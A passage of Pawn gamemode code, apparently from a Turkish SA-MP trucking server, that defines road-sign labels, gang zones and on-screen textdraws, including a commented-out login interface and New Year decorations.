 	//Create3DTextLabel("HGS",0xFFFF00FF,1637.0571, -11.8640, 42.1959,300,0);
 	Create3DTextLabel("Emkatu Adasi",0xFFFF00FF,-1411.6648, 2740.8816, 74.8882,200,0);
 	Create3DTextLabel("<<<LV SF>>>",0xFFFF00FF,-1417.0765, 2742.0688, 74.9187,200,0);
 	Create3DTextLabel(">>>Emkatu Sanayi",0xFFFF00FF,-1333.0231, 3401.0864, 117.6176,200,0);
 	Create3DTextLabel("Emkatu Otogar",0xFFFF00FF,-1339.7673, 3401.9451, 117.6699,200,0);
 	Create3DTextLabel("Tierre Robada",0xFFFF00FF,-1349.4762, 3406.1982, 117.0975,200,0);
 	Create3DTextLabel(">>>Emkatu Otogar",0xFFFF00FF,-1254.9072, 4015.1946, 117.6020,200,0);
 	Create3DTextLabel("Emkatu Petrolleri",0xFFFF00FF,-1261.4922, 4015.9155, 117.3505,200,0);
 	Create3DTextLabel("Emkatu Petrolleri",0xFFFF00FF,-1246.4808, 4155.2861, 116.7785,200,0);
 	Create3DTextLabel("Tugayogullari Island",0xFFFF00FF,-1481.3065,2736.2314,72.0161,200,0);
 	Create3DTextLabel(">>>Tugayogullari Petrol",0xFFFF00FF,-2435.9526,3262.3540,144.5580,200,0);
 	Create3DTextLabel("Las Venturas Emkatu",0xFFFF00FF,-2446.1528,3240.0642,144.5667,200,0);
 	Create3DTextLabel("Tugayogullari Insaat",0xFFFF00FF,-2438.0103,3255.9290,144.7845,200,0);
 	Create3DTextLabel("Tugayogullari Insaat, Otogar",0xFFFF00FF,-2740.6934,3346.3176,145.8477,200,0);
 	Create3DTextLabel("Tugayogullari Island",0xFFFF00FF,-2866.1843,1225.8965,12.2062,200,0);
 	Create3DTextLabel("San Fierro",0xFFFF00FF,-2875.0227,1215.1034,12.1603,200,0);
 	Create3DTextLabel("Tugayogullari Petrol",0xFFFF00FF,-2988.5808,2644.0667,145.2473,200,0);
 	Create3DTextLabel("<<<<Otogar, Insaat",0xFFFF00FF,-2996.4680,2646.1694,145.2352,200,0);*/

	// Haritada Ýþaretlenen Yollar
	/*
	// Konya Tabelalarý
 	Create3DTextLabel("Konya Askeri Sevkiyat Bolgesi",0xFFFF00FF,2167.4216,-3364.2170,33.4733,200,0);
 	Create3DTextLabel("Konya Organize Sanayii 1",0xFFFF00FF,2485.3821,-3575.9634,29.1021,200,0);
 	Create3DTextLabel("<<LOS SANTOS",0xFFFF00FF,3296.0164,-3338.5723,31.2750,200,0);
 	Create3DTextLabel("Konya Otogar\nKonya Petrolleri",0xFFFF00FF,3289.7966,-3339.9919,30.7945,200,0);
  	Create3DTextLabel("<<LOS SANTOS",0xFFFF00FF,3313.7874,-3331.8052,31.5733,200,0);
 	Create3DTextLabel("Konya Havalimaný",0xFFFF00FF,3307.3489,-3333.6919,31.5733,200,0);
 	Create3DTextLabel("Konya Sekiz Ýnþaat",0xFFFF00FF,3317.4243,-3325.6709,31.1733,200,0);
  	Create3DTextLabel("LOS SANTOS",0xFFFF00FF,3315.5503,-3318.4958,31.1733,200,0);
  	Create3DTextLabel("Konya Sekiz Ýnþaat\nKonya Petrolleri\nKonya Otogar",0xFFFF00FF,2703.1387,-3596.4363,25.1681,200,0);
  	Create3DTextLabel("Konya Sekiz Ýnþaat\nKonya Petrolleri\nKonya Otogar",0xFFFF00FF,2498.0232,-3559.6941,23.2609,200,0);
  	Create3DTextLabel("<<LOS SANTOS",0xFFFF00FF,2146.4907,-3353.5942,33.6733,200,0);
  	Create3DTextLabel("Konya Sekiz Ýnþaat\nKonya Petrolleri\nKonya Otogar",0xFFFF00FF,2145.6877,-3345.5396,33.6733,200,0);
  	Create3DTextLabel("LOS SANTOS",0xFFFF00FF,2169.1868,-3325.3318,33.6733,200,0);
  	Create3DTextLabel(">>LOS SANTOS",0xFFFF00FF,2189.6575,-3339.8193,33.9733,200,0);
  	Create3DTextLabel("Konya Organize Sanayii 2",0xFFFF00FF,2190.0171,-3347.6550,33.9733,200,0);
  	Create3DTextLabel("KONYA YOLU",0xFFFF00FF,2252.9497,-2681.9224,15.5049,200,0);
		// Feribot Rotasý ve Biniþ Yeri
		*/
	FZone[0] = GangZoneCreate(2541.160400,-2306.017578,3961.667236,-2279.083251);
	FZone[1] = GangZoneCreate(2538.244628,-2275.809570,2659.927978,-2221.594970);

	    // Kastamonu
	Zone[0] = GangZoneCreate(-3445.628906,460.342224,-2863.631591,478.626831);

		// Yeni Madison
	Zone[1] = GangZoneCreate(4009.984619,-3513.296630,4048.803710,-2434.052246);
	Zone[2] = GangZoneCreate(4016.313720,-4267.927246,4048.803466,-3712.980957);
	Zone[3] = GangZoneCreate(3853.945556,-4518.607421,4051.615722,-4269.037597);
	Zone[4] = GangZoneCreate(3969.885742,-3711.591308,4090.611572,-3514.785644);
	Zone[5] = GangZoneCreate(3531.725585,-3029.660888,4010.710205,-2998.256103);
	Zone[6] = GangZoneCreate(3409.893554,-3073.784667,3530.205566,-2955.283203);
	Zone[7] = GangZoneCreate(2815.081787,-3026.630371,3408.404052,-2998.625000);
	Zone[8] = GangZoneCreate(2597.481689,-3413.426513,2806.020019,-2996.649658);
	Zone[9] = GangZoneCreate(3003.321044,-3109.416015,3123.289306,-3030.429687);
	Zone[10] = GangZoneCreate(3965.603027,-2432.173339,4160.672851,-2180.994873);

		// Tugis Island Map New
	Zone[11] = GangZoneCreate(2903.675292,-799.761657,3064.063476,-769.580261);
	Zone[12] = GangZoneCreate(3065.609863,-863.379394,3145.490966,-705.920593);
	Zone[13] = GangZoneCreate(3147.036376,-799.526367,4661.513183,-770.807495);
	Zone[14] = GangZoneCreate(4626.289550,-764.769226,4662.203613,533.982849);
	Zone[15] = GangZoneCreate(4674.071289,-333.127075,4977.461425,437.397460);
	Zone[16] = GangZoneCreate(3900.772705,534.093566,4720.141601,598.680908);
	Zone[17] = GangZoneCreate(4294.955566,599.340942,4470.755371,668.251647);
	Zone[18] = GangZoneCreate(4641.162109,603.871032,4650.577636,702.240173);
	Zone[19] = GangZoneCreate(4491.261230,703.542114,4655.439453,821.499755);
	Zone[20] = GangZoneCreate(3791.010742,201.525329,4626.375976,228.777557);
	Zone[21] = GangZoneCreate(2693.157958,721.803710,3820.154052,751.598632);
	Zone[22] = GangZoneCreate(3791.088378,-1444.814208,3820.154052,721.803710);
	Zone[23] = GangZoneCreate(3787.114257,-2384.864257,3825.619628,-1444.567504);
	Zone[24] = GangZoneCreate(3787.418457,-2410.869628,3825.565185,-2385.132568);
	Zone[25] = GangZoneCreate(3641.166992,-2568.945068,3876.410156,-2381.319824);
	Zone[26] = GangZoneCreate(3579.666503,-2612.936035,3889.927246,-2582.388183);
	Zone[27] = GangZoneCreate(3694.763671,-2436.048095,3711.400390,-2091.384033);
	Zone[28] = GangZoneCreate(3510.014160,-2091.520019,3712.854248,-1903.147705);
	Zone[29] = GangZoneCreate(3583.114257,-2588.101318,3610.343750,-2052.185058);
	Zone[30] = GangZoneCreate(3713.361328,-2584.733642,3732.837890,-2568.571777);

	    // Diðer
	Zone[31] = GangZoneCreate(2110.261962,2841.001464,2137.040527,4827.736816);
	Zone[32] = GangZoneCreate(2879.126708,2636.985839,3280.097656,2713.865966);
	Zone[33] = GangZoneCreate(227.389846,2756.436279,248.096130,3078.537597);
	Zone[34] = GangZoneCreate(818.394104,-2730.130371,839.024414,-1794.118652);
	Zone[35] = GangZoneCreate(-1735.626708,-2921.785888,-1646.224243,-2749.840576);

   	// Ramazan Vakitleri Sistemi
	RamazanVakitYukle();
	RamazanUIYukle();

	// TUM TEXTDRAWLAR

	// V5 Oyuncu Arayüzü & SpeedoMeter Sistemi
	LoadV5UI();
	LoadSpeedo();

	// V4 Oyuncu Arayüzü
/*UI_AltBox = TextDrawCreate(-2.000000, 438.000000, "_");
TextDrawBackgroundColor(UI_AltBox, 255);
TextDrawFont(UI_AltBox, 1);
TextDrawLetterSize(UI_AltBox, 0.500000, 1.300000);
TextDrawColor(UI_AltBox, -1);
TextDrawSetOutline(UI_AltBox, 0);
TextDrawSetProportional(UI_AltBox, 1);
TextDrawSetShadow(UI_AltBox, 1);
TextDrawUseBox(UI_AltBox, 1);
TextDrawBoxColor(UI_AltBox, 180);
TextDrawTextSize(UI_AltBox, 641.000000, 0.000000);
TextDrawSetSelectable(UI_AltBox, 0);

UI_AltInfo = TextDrawCreate(37.000000, 437.000000, "~w~www.~g~~h~~h~tircilar-mekani~w~.com ~r~~h~/~w~market ~r~~h~/~w~yenilikler ~r~~h~/~g~~h~~h~vipbilgi ~r~~h~/~g~~h~~h~donator           ~r~~h~TS3 IP:ts.Canakkale Meslek.com~g~~h~~h~");TextDrawBackgroundColor(UI_AltInfo, 255);
TextDrawFont(UI_AltInfo, 2);
TextDrawLetterSize(UI_AltInfo, 0.180000, 1.000000);
TextDrawColor(UI_AltInfo, -1);
TextDrawSetOutline(UI_AltInfo, 1);
TextDrawSetProportional(UI_AltInfo, 1);
TextDrawSetSelectable(UI_AltInfo, 0);


UI_AltLogo[0] = TextDrawCreate(515.000000, 351.000000, "515 Model");
TextDrawBackgroundColor(UI_AltLogo[0], 255);
TextDrawFont(UI_AltLogo[0], 5);
TextDrawLetterSize(UI_AltLogo[0], 0.500000, 1.000000);
TextDrawColor(UI_AltLogo[0], -1);
TextDrawSetOutline(UI_AltLogo[0], 0);
TextDrawSetProportional(UI_AltLogo[0], 1);
TextDrawSetShadow(UI_AltLogo[0], 1);
TextDrawUseBox(UI_AltLogo[0], 1);
TextDrawBoxColor(UI_AltLogo[0], 255);
TextDrawTextSize(UI_AltLogo[0], 110.000000, 110.000000);
TextDrawSetPreviewModel(UI_AltLogo[0], 515);
TextDrawSetPreviewRot(UI_AltLogo[0], 0.000000, 0.000000, -40.000000, 1.000000);
TextDrawSetSelectable(UI_AltLogo[0], 0);
TextDrawBackgroundColor(UI_AltLogo[0], 0x00000000);
TextDrawSetPreviewVehCol(UI_AltLogo[0], 3, 1);

UI_AltLogo[1] = TextDrawCreate(608.000000, 437.000000, "~w~Canakkale Meslek Sunucusu ~r~~h~V5.0.0");
TextDrawAlignment(UI_AltLogo[1], 3);
TextDrawBackgroundColor(UI_AltLogo[1], 255);
TextDrawFont(UI_AltLogo[1], 2);
TextDrawLetterSize(UI_AltLogo[1], 0.180000, 1.000000);
TextDrawColor(UI_AltLogo[1], -1);
TextDrawSetOutline(UI_AltLogo[1], 1);
TextDrawSetProportional(UI_AltLogo[1], 1);
TextDrawSetSelectable(UI_AltLogo[1], 0);


UI_UstBox = TextDrawCreate(-3.000000, -6.000000, "_");
TextDrawBackgroundColor(UI_UstBox, 255);
TextDrawFont(UI_UstBox, 1);
TextDrawLetterSize(UI_UstBox, 0.500000, 1.000000);
TextDrawColor(UI_UstBox, -1);
TextDrawSetOutline(UI_UstBox, 0);
TextDrawSetProportional(UI_UstBox, 1);
TextDrawSetShadow(UI_UstBox, 1);
TextDrawUseBox(UI_UstBox, 1);
TextDrawBoxColor(UI_UstBox, 150);
TextDrawTextSize(UI_UstBox, 641.000000, 0.000000);
TextDrawSetSelectable(UI_UstBox, 0);

UI_SaatTarih = TextDrawCreate(631.000000, 1.000000, "~w~Tarih ~y~-  ~w~Saat ~y~-");
TextDrawAlignment(UI_SaatTarih, 3);
TextDrawBackgroundColor(UI_SaatTarih, 255);
TextDrawFont(UI_SaatTarih, 1);
TextDrawLetterSize(UI_SaatTarih, 0.200000, 0.799999);
TextDrawColor(UI_SaatTarih, -1);
TextDrawSetOutline(UI_SaatTarih, 1);
TextDrawSetProportional(UI_SaatTarih, 1);
TextDrawSetSelectable(UI_SaatTarih, 0);

UI_OLogo = TextDrawCreate(494.000000, 117.000000, "hud:radar_gangN");
TextDrawBackgroundColor(UI_OLogo, 255);
TextDrawFont(UI_OLogo, 4);
TextDrawLetterSize(UI_OLogo, 0.500000, 1.000000);
TextDrawColor(UI_OLogo, -1);
TextDrawSetOutline(UI_OLogo, 0);
TextDrawSetProportional(UI_OLogo, 1);
TextDrawSetShadow(UI_OLogo, 1);
TextDrawUseBox(UI_OLogo, 1);
TextDrawBoxColor(UI_OLogo, 255);
TextDrawTextSize(UI_OLogo, 16.000000, 16.000000);
TextDrawSetSelectable(UI_OLogo, 0);

UI_MLogo = TextDrawCreate(494.000000, 153.000000, "hud:radar_datedisco");
TextDrawBackgroundColor(UI_MLogo, 255);
TextDrawFont(UI_MLogo, 4);
TextDrawLetterSize(UI_MLogo, 0.500000, 1.000000);
TextDrawColor(UI_MLogo, -1);
TextDrawSetOutline(UI_MLogo, 0);
TextDrawSetProportional(UI_MLogo, 1);
TextDrawSetShadow(UI_MLogo, 1);
TextDrawUseBox(UI_MLogo, 1);
TextDrawBoxColor(UI_MLogo, 255);
TextDrawTextSize(UI_MLogo, 16.000000, 16.000000);
TextDrawSetSelectable(UI_MLogo, 0);

UI_GLogo = TextDrawCreate(494.000000, 194.000000, "hud:radar_light");
TextDrawBackgroundColor(UI_GLogo, 255);
TextDrawFont(UI_GLogo, 4);
TextDrawLetterSize(UI_GLogo, 0.500000, 1.000000);
TextDrawColor(UI_GLogo, -1);
TextDrawSetOutline(UI_GLogo, 0);
TextDrawSetProportional(UI_GLogo, 1);
TextDrawSetShadow(UI_GLogo, 1);
TextDrawUseBox(UI_GLogo, 1);
TextDrawBoxColor(UI_GLogo, 255);
TextDrawTextSize(UI_GLogo, 16.000000, 16.000000);
TextDrawSetSelectable(UI_GLogo, 0);

UI_FLogo[0] = TextDrawCreate(46.000000, 427.000000, "_");
TextDrawBackgroundColor(UI_FLogo[0], 255);
TextDrawFont(UI_FLogo[0], 1);
TextDrawLetterSize(UI_FLogo[0], 0.500000, 0.599999);
TextDrawColor(UI_FLogo[0], -1);
TextDrawSetOutline(UI_FLogo[0], 0);
TextDrawSetProportional(UI_FLogo[0], 1);
TextDrawSetShadow(UI_FLogo[0], 1);
TextDrawUseBox(UI_FLogo[0], 1);
TextDrawBoxColor(UI_FLogo[0], 3848191);
TextDrawTextSize(UI_FLogo[0], 54.000000, 0.000000);
TextDrawSetSelectable(UI_FLogo[0], 0);

UI_FLogo[1] = TextDrawCreate(47.000000, 424.000000, "f");
TextDrawBackgroundColor(UI_FLogo[1], 255);
TextDrawFont(UI_FLogo[1], 1);
TextDrawLetterSize(UI_FLogo[1], 0.500000, 1.400000);
TextDrawColor(UI_FLogo[1], -1);
TextDrawSetOutline(UI_FLogo[1], 0);
TextDrawSetProportional(UI_FLogo[1], 1);
TextDrawSetShadow(UI_FLogo[1], 0);
TextDrawSetSelectable(UI_FLogo[1], 0);

UI_FLogo[2] = TextDrawCreate(130.000000, 426.000000, "TircilarMekaniSAMP");
TextDrawAlignment(UI_FLogo[2], 3);
TextDrawBackgroundColor(UI_FLogo[2], 255);
TextDrawFont(UI_FLogo[2], 1);
TextDrawLetterSize(UI_FLogo[2], 0.210000, 0.899999);
TextDrawColor(UI_FLogo[2], -1);
TextDrawSetOutline(UI_FLogo[2], 1);
TextDrawSetProportional(UI_FLogo[2], 1);
TextDrawSetSelectable(UI_FLogo[2], 0);

UI_Login[0] = TextDrawCreate(-4.000000, -2.000000, "_");
TextDrawBackgroundColor(UI_Login[0], 255);
TextDrawFont(UI_Login[0], 1);
TextDrawLetterSize(UI_Login[0], 0.500000, 12.500001);
TextDrawColor(UI_Login[0], -1);
TextDrawSetOutline(UI_Login[0], 0);
TextDrawSetProportional(UI_Login[0], 1);
TextDrawSetShadow(UI_Login[0], 1);
TextDrawUseBox(UI_Login[0], 1);
TextDrawBoxColor(UI_Login[0], 200);
TextDrawTextSize(UI_Login[0], 654.000000, 10.000000);
TextDrawSetSelectable(UI_Login[0], 0);

UI_Login[1] = TextDrawCreate(-4.000000, 341.000000, "_");
TextDrawBackgroundColor(UI_Login[1], 255);
TextDrawFont(UI_Login[1], 1);
TextDrawLetterSize(UI_Login[1], 0.500000, 12.500001);
TextDrawColor(UI_Login[1], -1);
TextDrawSetOutline(UI_Login[1], 0);
TextDrawSetProportional(UI_Login[1], 1);
TextDrawSetShadow(UI_Login[1], 1);
TextDrawUseBox(UI_Login[1], 1);
TextDrawBoxColor(UI_Login[1], 200);
TextDrawTextSize(UI_Login[1], 654.000000, 10.000000);
TextDrawSetSelectable(UI_Login[1], 0);

UI_Login[2] = TextDrawCreate(280.000000, 9.000000, "Model 515 Skin");
TextDrawBackgroundColor(UI_Login[2], 255);
TextDrawFont(UI_Login[2], 5);
TextDrawLetterSize(UI_Login[2], 0.500000, 1.000000);
TextDrawColor(UI_Login[2], -1);
TextDrawSetOutline(UI_Login[2], 0);
TextDrawSetProportional(UI_Login[2], 1);
TextDrawSetShadow(UI_Login[2], 1);
TextDrawUseBox(UI_Login[2], 1);
TextDrawBoxColor(UI_Login[2], 255);
TextDrawTextSize(UI_Login[2], 100.000000, 100.000000);
TextDrawSetPreviewModel(UI_Login[2], 515);
TextDrawSetPreviewRot(UI_Login[2], 0.000000, 0.000000, -30.000000, 1.000000);
TextDrawSetSelectable(UI_Login[2], 0);
TextDrawBackgroundColor(UI_Login[2], 0x00000000);
TextDrawSetPreviewVehCol(UI_Login[2], 3, 1);

UI_Login[3] = TextDrawCreate(321.000000, 84.000000, "Canakkale Meslek Sunucusu");
TextDrawAlignment(UI_Login[3], 2);
TextDrawBackgroundColor(UI_Login[3], 255);
TextDrawFont(UI_Login[3], 2);
TextDrawLetterSize(UI_Login[3], 0.420000, 1.800000);
TextDrawColor(UI_Login[3], -1);
TextDrawSetOutline(UI_Login[3], 0);
TextDrawSetProportional(UI_Login[3], 1);
TextDrawSetShadow(UI_Login[3], 1);
TextDrawSetSelectable(UI_Login[3], 0);

UI_Login[4] = TextDrawCreate(321.000000, 100.000000, "Meslek Sunucusu");
TextDrawAlignment(UI_Login[4], 2);
TextDrawBackgroundColor(UI_Login[4], 255);
TextDrawFont(UI_Login[4], 1);
TextDrawLetterSize(UI_Login[4], 0.230000, 1.100000);
TextDrawColor(UI_Login[4], -2130706433);
TextDrawSetOutline(UI_Login[4], 0);
TextDrawSetProportional(UI_Login[4], 1);
TextDrawSetShadow(UI_Login[4], 1);
TextDrawSetSelectable(UI_Login[4], 0);

UI_Login[5] = TextDrawCreate(250.000000, 101.000000, "]]]]");
TextDrawBackgroundColor(UI_Login[5], 255);
TextDrawFont(UI_Login[5], 2);
TextDrawLetterSize(UI_Login[5], 0.290000, 0.899999);
TextDrawColor(UI_Login[5], -4194049);
TextDrawSetOutline(UI_Login[5], 0);
TextDrawSetProportional(UI_Login[5], 1);
TextDrawSetShadow(UI_Login[5], 1);
TextDrawSetSelectable(UI_Login[5], 0);

UI_Login[6] = TextDrawCreate(354.000000, 101.000000, "]]]]");
TextDrawBackgroundColor(UI_Login[6], 255);
TextDrawFont(UI_Login[6], 2);
TextDrawLetterSize(UI_Login[6], 0.290000, 0.899999);
TextDrawColor(UI_Login[6], -4194049);
TextDrawSetOutline(UI_Login[6], 0);
TextDrawSetProportional(UI_Login[6], 1);
TextDrawSetShadow(UI_Login[6], 1);
TextDrawSetSelectable(UI_Login[6], 0);
*/
// YILBAÞI TEXTDRAWlarý
Textdraw17 = TextDrawCreate(522.000000, 360.000000, "654 Model");
TextDrawBackgroundColor(Textdraw17, 255);
TextDrawFont(Textdraw17, 5);
TextDrawLetterSize(Textdraw17, 0.500000, 1.000000);
TextDrawColor(Textdraw17, -1);
TextDrawSetOutline(Textdraw17, 0);
TextDrawSetProportional(Textdraw17, 1);
TextDrawSetShadow(Textdraw17, 1);
TextDrawUseBox(Textdraw17, 1);
TextDrawBoxColor(Textdraw17, 255);
TextDrawTextSize(Textdraw17, 104.000000, 76.000000);
TextDrawSetPreviewModel(Textdraw17, 654);
TextDrawSetPreviewRot(Textdraw17, 0.000000, 0.000000, -40.000000, 1.000000);
TextDrawSetSelectable(Textdraw17, 0);
TextDrawBackgroundColor(Textdraw17, 0x00000000);

Textdraw18 = TextDrawCreate(548.000000, 420.000000, "yillar");
TextDrawBackgroundColor(Textdraw18, -12566273);
TextDrawFont(Textdraw18, 3);
TextDrawLetterSize(Textdraw18, 0.370000, 1.200000);
TextDrawColor(Textdraw18, -117899265);
TextDrawSetOutline(Textdraw18, 0);
TextDrawSetProportional(Textdraw18, 1);
TextDrawSetShadow(Textdraw18, 0);
TextDrawSetSelectable(Textdraw18, 0);

Textdraw19 = TextDrawCreate(552.000000, 411.000000, "mutlu");
TextDrawBackgroundColor(Textdraw19, -12566273);
TextDrawFont(Textdraw19, 3);
TextDrawLetterSize(Textdraw19, 0.370000, 1.200000);
TextDrawColor(Textdraw19, -117899265);
TextDrawSetOutline(Textdraw19, 0);
TextDrawSetProportional(Textdraw19, 1);
TextDrawSetShadow(Textdraw19, 0);
TextDrawSetSelectable(Textdraw19, 0);

Textdraw20 = TextDrawCreate(553.000000, 412.000000, "mutlu");
TextDrawBackgroundColor(Textdraw20, -12566273);
TextDrawFont(Textdraw20, 3);
TextDrawLetterSize(Textdraw20, 0.370000, 1.200000);
TextDrawColor(Textdraw20, -12566273);
TextDrawSetOutline(Textdraw20, 0);
TextDrawSetProportional(Textdraw20, 1);
TextDrawSetShadow(Textdraw20, 0);
TextDrawSetSelectable(Textdraw20, 0);

Textdraw21 = TextDrawCreate(549.000000, 421.000000, "yillar");
TextDrawBackgroundColor(Textdraw21, -12566273);
TextDrawFont(Textdraw21, 3);
TextDrawLetterSize(Textdraw21, 0.370000, 1.200000);
TextDrawColor(Textdraw21, 255);
TextDrawSetOutline(Textdraw21, 0);
TextDrawSetProportional(Textdraw21, 1);
TextDrawSetShadow(Textdraw21, 0);
TextDrawSetSelectable(Textdraw21, 0);

Textdraw22 = TextDrawCreate(567.000000, 355.000000, "]");
TextDrawBackgroundColor(Textdraw22, 255);
TextDrawFont(Textdraw22, 2);
TextDrawLetterSize(Textdraw22, 0.500000, 1.899999);
TextDrawColor(Textdraw22, -4194049);
TextDrawSetOutline(Textdraw22, 1);
TextDrawSetProportional(Textdraw22, 1);
TextDrawSetSelectable(Textdraw22, 0);

Textdraw23 = TextDrawCreate(566.000000, 386.000000, "T");
TextDrawBackgroundColor(Textdraw23, 255);
TextDrawFont(Textdraw23, 1);
TextDrawLetterSize(Textdraw23, 0.330000, -1.099999);
TextDrawColor(Textdraw23, -16776961);
TextDrawSetOutline(Textdraw23, 0);
TextDrawSetProportional(Textdraw23, 1);
TextDrawSetShadow(Textdraw23, 0);
TextDrawSetSelectable(Textdraw23, 0);

Textdraw24 = TextDrawCreate(580.000000, 410.000000, "T");
TextDrawBackgroundColor(Textdraw24, 255);
TextDrawFont(Textdraw24, 1);
TextDrawLetterSize(Textdraw24, 0.330000, -1.099999);
TextDrawColor(Textdraw24, -16776961);
TextDrawSetOutline(Textdraw24, 0);
TextDrawSetProportional(Textdraw24, 1);
TextDrawSetShadow(Textdraw24, 0);
TextDrawSetSelectable(Textdraw24, 0);

Textdraw25 = TextDrawCreate(573.000000, 396.000000, "T");
TextDrawBackgroundColor(Textdraw25, 255);
TextDrawFont(Textdraw25, 1);
TextDrawLetterSize(Textdraw25, 0.330000, -1.099999);
TextDrawColor(Textdraw25, 1214775295);
TextDrawSetOutline(Textdraw25, 0);
TextDrawSetProportional(Textdraw25, 1);
TextDrawSetShadow(Textdraw25, 0);
TextDrawSetSelectable(Textdraw25, 0);

Textdraw26 = TextDrawCreate(565.000000, 401.000000, "T");
TextDrawBackgroundColor(Textdraw26, 255);
TextDrawFont(Textdraw26, 1);
TextDrawLetterSize(Textdraw26, 0.330000, -1.099999);
TextDrawColor(Textdraw26, -1);
TextDrawSetOutline(Textdraw26, 0);
TextDrawSetProportional(Textdraw26, 1);
TextDrawSetShadow(Textdraw26, 0);
TextDrawSetSelectable(Textdraw26, 0);

Textdraw27 = TextDrawCreate(560.000000, 413.000000, "T");
TextDrawBackgroundColor(Textdraw27, 255);
TextDrawFont(Textdraw27, 1);
TextDrawLetterSize(Textdraw27, 0.330000, -1.099999);
TextDrawColor(Textdraw27, -65281);
TextDrawSetOutline(Textdraw27, 0);
TextDrawSetProportional(Textdraw27, 1);
TextDrawSetShadow(Textdraw27, 0);
TextDrawSetSelectable(Textdraw27, 0);

Textdraw28 = TextDrawCreate(548.000000, 382.000000, ".");
TextDrawBackgroundColor(Textdraw28, 255);
TextDrawFont(Textdraw28, 1);
TextDrawLetterSize(Textdraw28, 0.290000, 1.100000);
TextDrawColor(Textdraw28, -1);
TextDrawSetOutline(Textdraw28, 0);
TextDrawSetProportional(Textdraw28, 1);
TextDrawSetShadow(Textdraw28, 0);
TextDrawSetSelectable(Textdraw28, 0);

Textdraw29 = TextDrawCreate(552.000000, 390.000000, ".");
TextDrawBackgroundColor(Textdraw29, 255);
TextDrawFont(Textdraw29, 1);
TextDrawLetterSize(Textdraw29, 0.290000, 1.100000);
TextDrawColor(Textdraw29, -1);
TextDrawSetOutline(Textdraw29, 0);
TextDrawSetProportional(Textdraw29, 1);
TextDrawSetShadow(Textdraw29, 0);
TextDrawSetSelectable(Textdraw29, 0);

Textdraw30 = TextDrawCreate(549.000000, 400.000000, ".");
TextDrawBackgroundColor(Textdraw30, 255);
TextDrawFont(Textdraw30, 1);
TextDrawLetterSize(Textdraw30, 0.290000, 1.100000);
TextDrawColor(Textdraw30, -1);
TextDrawSetOutline(Textdraw30, 0);
TextDrawSetProportional(Textdraw30, 1);
TextDrawSetShadow(Textdraw30, 0);
TextDrawSetSelectable(Textdraw30, 0);

Textdraw31 = TextDrawCreate(588.000000, 377.000000, ".");
TextDrawBackgroundColor(Textdraw31, 255);
TextDrawFont(Textdraw31, 1);
TextDrawLetterSize(Textdraw31, 0.290000, 1.100000);
TextDrawColor(Textdraw31, -1);
TextDrawSetOutline(Textdraw31, 0);
TextDrawSetProportional(Textdraw31, 1);
TextDrawSetShadow(Textdraw31, 0);
TextDrawSetSelectable(Textdraw31, 0);

Textdraw32 = TextDrawCreate(594.000000, 384.000000, ".");
TextDrawBackgroundColor(Textdraw32, 255);
TextDrawFont(Textdraw32, 1);
TextDrawLetterSize(Textdraw32, 0.290000, 1.100000);
TextDrawColor(Textdraw32, -1);
TextDrawSetOutline(Textdraw32, 0);
TextDrawSetProportional(Textdraw32, 1);
TextDrawSetShadow(Textdraw32, 0);
TextDrawSetSelectable(Textdraw32, 0);

Textdraw33 = TextDrawCreate(591.000000, 393.000000, ".");
TextDrawBackgroundColor(Textdraw33, 255);
TextDrawFont(Textdraw33, 1);
TextDrawLetterSize(Textdraw33, 0.290000, 1.100000);
TextDrawColor(Textdraw33, -1);
TextDrawSetOutline(Textdraw33, 0);
TextDrawSetProportional(Textdraw33, 1);
TextDrawSetShadow(Textdraw33, 0);
TextDrawSetSelectable(Textdraw33, 0);

Textdraw34 = TextDrawCreate(591.000000, 366.000000, ".");
TextDrawBackgroundColor(Textdraw34, 255);
TextDrawFont(Textdraw34, 1);
TextDrawLetterSize(Textdraw34, 0.290000, 1.100000);
TextDrawColor(Textdraw34, -1);
TextDrawSetOutline(Textdraw34, 0);
TextDrawSetProportional(Textdraw34, 1);
TextDrawSetShadow(Textdraw34, 0);
TextDrawSetSelectable(Textdraw34, 0);

Textdraw35 = TextDrawCreate(598.000000, 401.000000, ".");
TextDrawBackgroundColor(Textdraw35, 255);
TextDrawFont(Textdraw35, 1);
TextDrawLetterSize(Textdraw35, 0.290000, 1.100000);
TextDrawColor(Textdraw35, -1);
TextDrawSetOutline(Textdraw35, 0);
TextDrawSetProportional(Textdraw35, 1);
TextDrawSetShadow(Textdraw35, 0);
TextDrawSetSelectable(Textdraw35, 0);

Textdraw36 = TextDrawCreate(601.000000, 373.000000, ".");
TextDrawBackgroundColor(Textdraw36, 255);
TextDrawFont(Textdraw36, 1);
TextDrawLetterSize(Textdraw36, 0.290000, 1.100000);
TextDrawColor(Textdraw36, -1);
TextDrawSetOutline(Textdraw36, 0);
TextDrawSetProportional(Textdraw36, 1);
TextDrawSetShadow(Textdraw36, 0);
TextDrawSetSelectable(Textdraw36, 0);

Textdraw37 = TextDrawCreate(605.000000, 388.000000, ".");
TextDrawBackgroundColor(Textdraw37, 255);
TextDrawFont(Textdraw37, 1);
TextDrawLetterSize(Textdraw37, 0.290000, 1.100000);
TextDrawColor(Textdraw37, -1);
TextDrawSetOutline(Textdraw37, 0);
TextDrawSetProportional(Textdraw37, 1);
TextDrawSetShadow(Textdraw37, 0);
TextDrawSetSelectable(Textdraw37, 0);

Textdraw38 = TextDrawCreate(602.000000, 411.000000, ".");
TextDrawBackgroundColor(Textdraw38, 255);
TextDrawFont(Textdraw38, 1);
TextDrawLetterSize(Textdraw38, 0.290000, 1.100000);
TextDrawColor(Textdraw38, -1);
TextDrawSetOutline(Textdraw38, 0);
TextDrawSetProportional(Textdraw38, 1);
TextDrawSetShadow(Textdraw38, 0);
TextDrawSetSelectable(Textdraw38, 0);

Textdraw39 = TextDrawCreate(612.000000, 397.000000, ".");
TextDrawBackgroundColor(Textdraw39, 255);
TextDrawFont(Textdraw39, 1);
TextDrawLetterSize(Textdraw39, 0.290000, 1.100000);
TextDrawColor(Textdraw39, -1);
TextDrawSetOutline(Textdraw39, 0);
TextDrawSetProportional(Textdraw39, 1);
TextDrawSetShadow(Textdraw39, 0);
TextDrawSetSelectable(Textdraw39, 0);

Textdraw40 = TextDrawCreate(556.000000, 369.000000, ".");
TextDrawBackgroundColor(Textdraw40, 255);
TextDrawFont(Textdraw40, 1);
TextDrawLetterSize(Textdraw40, 0.290000, 1.100000);
TextDrawColor(Textdraw40, -1);
TextDrawSetOutline(Textdraw40, 0);
TextDrawSetProportional(Textdraw40, 1);
TextDrawSetShadow(Textdraw40, 0);
TextDrawSetSelectable(Textdraw40, 0);

Textdraw41 = TextDrawCreate(615.000000, 377.000000, ".");
TextDrawBackgroundColor(Textdraw41, 255);
